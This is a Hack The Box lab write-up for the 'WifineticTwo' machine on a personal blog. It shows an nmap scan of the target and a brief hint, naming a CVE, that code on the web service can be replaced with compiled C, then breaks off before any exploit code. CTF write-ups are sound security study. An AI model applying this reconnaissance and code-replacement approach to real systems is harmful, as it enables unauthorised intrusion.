@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+
+
+<html theme="dark" showBanner="true" hasBanner="desktop" > 
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+
+  
+  <title>【season-4】htb WifineticTwo wp | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+
+  <meta name="description" content="usernmap  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596PORT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【season-4】htb WifineticTwo wp">
+<meta property="og:url" content="http://example.com/2024/03/23/box-WifineticTwo-wp/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="usernmap  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596PORT">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/wpimages/2024/wifinetictwo/backgroup.jpg">
+<meta property="article:published_time" content="2024-03-22T19:10:54.000Z">
+<meta property="article:modified_time" content="2024-04-09T08:05:14.885Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/wpimages/2024/wifinetictwo/backgroup.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+  
+  
+    
+<div id="banner" class="">
+  <img src="/images/backgroup.jpg" itemprop="image">
+  <div id="banner-dim"></div>
+</div>
+ 
+   
+  <div id="main-grid" class="  ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>Hexo </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
+      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
+        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
+      </a>
+    
+    <div id="nav-menu-btn" class="nav-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <image src=/images/avatar.jpg></image>
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">Flower </div>
+      <div class="dot"></div>
+      <div class="subtitle">Hi Im Flower </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+    
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Tags</h3>
+      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+    </div>
+  </div>
+
+
+  
+  <div class="sticky">
+    
+      
+
+
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Categories</h3>
+      <div class="category-box">
+            <a class="category-link" href="/categories/htb-Season-4/">
+                htb-Season-4
+                <div class="category-count">3</div>
+            </a>
+        
+            <a class="category-link" href="/categories/ctf/">
+                ctf
+                <div class="category-count">1</div>
+            </a>
+        
+            <a class="category-link" href="/categories/Sherlocks/">
+                Sherlocks
+                <div class="category-count">1</div>
+            </a>
+        </div>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Recent Posts</h3>
+      <ul>
+        
+          <a class="recent-link" href="/2024/03/23/box-WifineticTwo-wp/" title="【season-4】htb WifineticTwo wp" >
+            <div class="recent-link-text">
+              【season-4】htb WifineticTwo wp
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/02/26/box-jab-wp/" title="【season-4】htb jab wp" >
+            <div class="recent-link-text">
+              【season-4】htb jab wp
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/02/20/ctf-blockchain-1/" title="htb—ctf-blockchain/Distract_and Destroy" >
+            <div class="recent-link-text">
+              htb—ctf-blockchain/Distract_and Destroy
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/02/19/box-office-wp/" title="【season-4】htb office wp" >
+            <div class="recent-link-text">
+              【season-4】htb office wp
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/02/13/test/" title="【Sherlocks圣诞节特辑】htb OpTinselTrace-4 wp" >
+            <div class="recent-link-text">
+              【Sherlocks圣诞节特辑】htb OpTinselTrace-4 wp
+            </div>
+          </a>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+
+<article id="post-box-WifineticTwo-wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+<div class="article-gallery">
+  <div class="article-gallery-photos">
+    
+      <a class="article-gallery-img" rel="gallery_clus3ldah0000rgkygkjt3ep2">
+        <img src="/wpimages/2024/wifinetictwo/backgroup.jpg" itemprop="image">
+      </a>
+    
+  </div>
+</div>
+
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        【season-4】htb WifineticTwo wp
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2024-03-22T19:10:54.000Z" itemprop="datePublished">2024-03-23</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+  <a class="meta-cate-link" href="/categories/htb-Season-4/">htb-Season-4</a>
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            13k words 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>nmap </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)</span><br><span class="line">|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)</span><br><span class="line">|_  256 18:<span class="built_in">cd</span>:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)</span><br><span class="line">8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18</span><br><span class="line">| http-title: Site doesnt have a title (text/html; charset=utf-8).</span><br><span class="line">|_Requested resource was http://10.10.11.7:8080/login</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   FourOhFourRequest: </span><br><span class="line">|     HTTP/1.0 404 NOT FOUND</span><br><span class="line">|     content-type: text/html; charset=utf-8</span><br><span class="line">|     content-length: 232</span><br><span class="line">|     vary: Cookie</span><br><span class="line">|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.Zfelqw.Aq1NMe9Z_Z-hdlL2RcbM1DXlKGU; Expires=Mon, 18-Mar-2024 02:28:39 GMT; HttpOnly; Path=/</span><br><span class="line">|     server: Werkzeug/1.0.1 Python/2.7.18</span><br><span class="line">|     <span class="built_in">date</span>: Mon, 18 Mar 2024 02:23:39 GMT</span><br><span class="line">|     &lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span><br><span class="line">|     &lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class="line">|     &lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.0 302 FOUND</span><br><span class="line">|     content-type: text/html; charset=utf-8</span><br><span class="line">|     content-length: 219</span><br><span class="line">|     location: http://0.0.0.0:8080/login</span><br><span class="line">|     vary: Cookie</span><br><span class="line">|     set-cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.ZfelqA.nN6MbTZPfWh0GH_zwv0QNyj684U; Expires=Mon, 18-Mar-2024 02:28:36 GMT; HttpOnly; Path=/</span><br><span class="line">|     server: Werkzeug/1.0.1 Python/2.7.18</span><br><span class="line">|     <span class="built_in">date</span>: Mon, 18 Mar 2024 02:23:36 GMT</span><br><span class="line">|     &lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span><br><span class="line">|     &lt;title&gt;Redirecting...&lt;/title&gt;</span><br><span class="line">|     &lt;h1&gt;Redirecting...&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;You should be redirected automatically to target URL: &lt;a href=<span class="string">&quot;/login&quot;</span>&gt;/login&lt;/a&gt;. If not click the <span class="built_in">link</span>.</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     content-type: text/html; charset=utf-8</span><br><span class="line">|     allow: HEAD, OPTIONS, GET</span><br><span class="line">|     vary: Cookie</span><br><span class="line">|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.ZfelqQ.HQmJQZxDo7-H-bGWAF5z9ShIk9c; Expires=Mon, 18-Mar-2024 02:28:37 GMT; HttpOnly; Path=/</span><br><span class="line">|     content-length: 0</span><br><span class="line">|     server: Werkzeug/1.0.1 Python/2.7.18</span><br><span class="line">|     <span class="built_in">date</span>: Mon, 18 Mar 2024 02:23:37 GMT</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     HTTP/1.1 400 Bad request</span><br><span class="line">|     content-length: 90</span><br><span class="line">|     cache-control: no-cache</span><br><span class="line">|     content-type: text/html</span><br><span class="line">|     connection: close</span><br><span class="line">|     &lt;html&gt;&lt;body&gt;&lt;h1&gt;400 Bad request&lt;/h1&gt;</span><br><span class="line">|     Your browser sent an invalid request.</span><br><span class="line">|_    &lt;/body&gt;&lt;/html&gt;</span><br><span class="line">|_http-server-header: Werkzeug/1.0.1 Python/2.7.18</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port8080-TCP:V=7.94SVN%I=7%D=3/17%Time=65F7A5A7%P=x86_64-pc-linux-gnu%r</span><br><span class="line">SF:(GetRequest,24C,<span class="string">&quot;HTTP/1\.0\x20302\x20FOUND\r\ncontent-type:\x20text/htm</span></span><br><span class="line"><span class="string">SF:l;\x20charset=utf-8\r\ncontent-length:\x20219\r\nlocation:\x20http://0\</span></span><br><span class="line"><span class="string">SF:.0\.0\.0:8080/login\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfZn</span></span><br><span class="line"><span class="string">SF:Jlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ\.ZfelqA\.nN6MbTZPfWh0GH_zwv0QN</span></span><br><span class="line"><span class="string">SF:yj684U;\x20Expires=Mon,\x2018-Mar-2024\x2002:28:36\x20GMT;\x20HttpOnly;</span></span><br><span class="line"><span class="string">SF:\x20Path=/\r\nserver:\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x</span></span><br><span class="line"><span class="string">SF:20Mon,\x2018\x20Mar\x202024\x2002:23:36\x20GMT\r\n\r\n&lt;!DOCTYPE\x20HTML</span></span><br><span class="line"><span class="string">SF:\x20PUBLIC\x20\&quot;-//W3C//DTD\x20HTML\x203\.2\x20Final//EN\&quot;&gt;\n&lt;title&gt;Red</span></span><br><span class="line"><span class="string">SF:irecting\.\.\.&lt;/title&gt;\n&lt;h1&gt;Redirecting\.\.\.&lt;/h1&gt;\n&lt;p&gt;You\x20should\x2</span></span><br><span class="line"><span class="string">SF:0be\x20redirected\x20automatically\x20to\x20target\x20URL:\x20&lt;a\x20hre</span></span><br><span class="line"><span class="string">SF:f=\&quot;/login\&quot;&gt;/login&lt;/a&gt;\.\x20\x20If\x20not\x20click\x20the\x20link\.&quot;</span>)%</span><br><span class="line">SF:r(HTTPOptions,14E,<span class="string">&quot;HTTP/1\.0\x20200\x20OK\r\ncontent-type:\x20text/html</span></span><br><span class="line"><span class="string">SF:;\x20charset=utf-8\r\nallow:\x20HEAD,\x20OPTIONS,\x20GET\r\nvary:\x20Co</span></span><br><span class="line"><span class="string">SF:okie\r\nset-cookie:\x20session=eyJfcGVybWFuZW50Ijp0cnVlfQ\.ZfelqQ\.HQmJ</span></span><br><span class="line"><span class="string">SF:QZxDo7-H-bGWAF5z9ShIk9c;\x20Expires=Mon,\x2018-Mar-2024\x2002:28:37\x20</span></span><br><span class="line"><span class="string">SF:GMT;\x20HttpOnly;\x20Path=/\r\ncontent-length:\x200\r\nserver:\x20Werkz</span></span><br><span class="line"><span class="string">SF:eug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Mon,\x2018\x20Mar\x202024\x2</span></span><br><span class="line"><span class="string">SF:002:23:37\x20GMT\r\n\r\n&quot;</span>)%r(RTSPRequest,CF,<span class="string">&quot;HTTP/1\.1\x20400\x20Bad\x2</span></span><br><span class="line"><span class="string">SF:0request\r\ncontent-length:\x2090\r\ncache-control:\x20no-cache\r\ncont</span></span><br><span class="line"><span class="string">SF:ent-type:\x20text/html\r\nconnection:\x20close\r\n\r\n&lt;html&gt;&lt;body&gt;&lt;h1&gt;4</span></span><br><span class="line"><span class="string">SF:00\x20Bad\x20request&lt;/h1&gt;\nYour\x20browser\x20sent\x20an\x20invalid\x20</span></span><br><span class="line"><span class="string">SF:request\.\n&lt;/body&gt;&lt;/html&gt;\n&quot;</span>)%r(FourOhFourRequest,224,<span class="string">&quot;HTTP/1\.0\x20404</span></span><br><span class="line"><span class="string">SF:\x20NOT\x20FOUND\r\ncontent-type:\x20text/html;\x20charset=utf-8\r\ncon</span></span><br><span class="line"><span class="string">SF:tent-length:\x20232\r\nvary:\x20Cookie\r\nset-cookie:\x20session=eyJfcG</span></span><br><span class="line"><span class="string">SF:VybWFuZW50Ijp0cnVlfQ\.Zfelqw\.Aq1NMe9Z_Z-hdlL2RcbM1DXlKGU;\x20Expires=M</span></span><br><span class="line"><span class="string">SF:on,\x2018-Mar-2024\x2002:28:39\x20GMT;\x20HttpOnly;\x20Path=/\r\nserver</span></span><br><span class="line"><span class="string">SF::\x20Werkzeug/1\.0\.1\x20Python/2\.7\.18\r\ndate:\x20Mon,\x2018\x20Mar\</span></span><br><span class="line"><span class="string">SF:x202024\x2002:23:39\x20GMT\r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W</span></span><br><span class="line"><span class="string">SF:3C//DTD\x20HTML\x203\.2\x20Final//EN\&quot;&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/ti</span></span><br><span class="line"><span class="string">SF:tle&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1&gt;\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x</span></span><br><span class="line"><span class="string">SF:20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\</span></span><br><span class="line"><span class="string">SF:x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x20aga</span></span><br><span class="line"><span class="string">SF:in\.&lt;/p&gt;\n&quot;</span>);</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 74.58 seconds</span><br></pre></td></tr></table></figure>
+<p><img src="/wpimages/2024/wifinetictwo/1.png" alt="1"></p>
+<p>可以找到得cve是CVE-2018-20818，但其实他本身就可以编译C这里可以直接替换hardword里的部分</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span 